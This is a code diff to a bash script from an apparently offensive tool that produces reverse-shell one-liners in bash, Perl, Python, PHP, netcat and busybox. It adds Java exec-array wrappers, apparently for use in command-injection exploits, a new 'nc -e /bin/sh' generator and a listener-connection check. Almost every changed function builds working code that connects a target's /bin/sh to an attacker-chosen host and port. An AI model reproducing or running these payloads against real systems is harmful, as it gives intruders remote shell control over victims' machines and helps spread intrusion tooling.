@@ -19,10 +19,10 @@ get_bash_reverse_shell() {
     if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
         reverse_shell='nohup '"$reverse_shell"' &'
     fi
-    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
-    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
+    elif [[ -z "$reverse_type" ]] || [[ "$reverse_type" != "minimal" ]]; then
         reverse_shell="bash -c \"$reverse_shell\""
     fi
     echo "$reverse_shell"
@@ -31,16 +31,19 @@ get_bash_reverse_shell() {
 get_perl_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell=''\''use Socket;$i="'"$host_ip"'";$p='"$host_port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''
-    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
-        echo "$reverse_shell"
-    else
+
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"perl\", \"-e\" , \"$reverse_shell\"}"
+    elif [[ -z $reverse_type ]] || [[ $reverse_type != "minimal" ]]; then
         reverse_shell="perl -e $reverse_shell"
-        echo "$reverse_shell"
     fi
+    echo "$reverse_shell"
+
 }
 get_python_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["/bin/sh","-i"]);'
     local python_exe=""
     if [[ -z $python_version ]]; then
         python_exe="python3"
@@ -52,21 +55,30 @@ get_python_reverse_shell() {
         python_exe="python3"
     fi
 
-    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
-        #reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"$python_exe\", \"-c\" , \"$reverse_shell\"}"
-    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
+    elif [[ -z "$reverse_type" ]] || [[ "$reverse_type" != "minimal" ]]; then
         reverse_shell="$python_exe -c '$reverse_shell'"
-
     fi
     echo "$reverse_shell"
 }
+
+get_nc_reverse_shell_simple() {
+    prepare_generic_linux_shell
+    local reverse_shell='nc '"$host_ip"' '"$host_port"' -e /bin/sh'
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell="{\"nc\", \"$host_ip\" , \"$host_port\", \"-e\", \"/bin/sh\"}"
+    fi
+    echo "$reverse_shell"
+}
+
 get_nc_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"$host_ip"' '"$host_port"' >/tmp/f'
-    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
-        reverse_shell="/bin/sh $host_ip $host_port"
-        reverse_shell="{\"nc\", \"-c\" , \"$reverse_shell\"}"
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
     fi
     echo "$reverse_shell"
 }
@@ -77,18 +89,23 @@ get_busybox_reverse_shell() {
     if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
         reverse_shell='nohup '"$reverse_shell"' &'
     fi
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell="{\"busybox\", \"nc\" , \"$host_ip\", \"$host_port\", \"-e\", \"/bin/sh\"}"
+    fi
     echo "$reverse_shell"
 }
 
 get_php_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);"
-    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
-        echo "$reverse_shell"
-    else
+    if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
+        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
+        reverse_shell="{\"php\", \"-r\" , \"$reverse_shell\"}"
+    elif [[ -z $reverse_type ]] || [[ $reverse_type != "minimal" ]]; then
         reverse_shell="php -r '$reverse_shell'"
-        echo "$reverse_shell"
     fi
+    echo "$reverse_shell"
+
 }
 
 encode_powershell() {
@@ -403,7 +420,7 @@ is_listener_connected() {
     else
         target_ip=$1
     fi
-    if ss -tpn | grep "$host_port.*$target_ip"; then
+    if ss -tpn | grep "$host_port .*$target_ip"; then
         echo "Listener is connected to $target_ip on port $host_port."
         return 0
     else
